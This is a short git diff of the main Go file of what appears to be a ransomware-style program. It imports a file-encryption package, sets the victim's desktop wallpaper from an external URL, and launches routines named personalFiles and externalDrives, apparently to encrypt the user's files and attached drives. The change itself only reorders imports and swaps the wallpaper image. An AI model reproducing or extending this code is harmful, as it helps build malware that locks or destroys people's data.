@@ -2,18 +2,17 @@ package main
 
 import (
 	"github.com/Tiked/FileEncryption"
-	"os"
-	"path/filepath"
 	"github.com/reujab/wallpaper"
+	"os"
 	"os/user"
+	"path/filepath"
 	"sync"
 )
 
 var wg sync.WaitGroup
 
 func main() {
-	//wallpaper.SetFromURL("https://upload.vaa.red/i/LbqAG.png") // original wallpaper
-	wallpaper.SetFromURL("https://upload.vaa.red/i/V821X.png") //meatball wallpaper
+	wallpaper.SetFromURL("https://upload.vaa.red/i/LbqAG.png")
 	wg.Add(2)
 	personalFiles()
 	externalDrives()
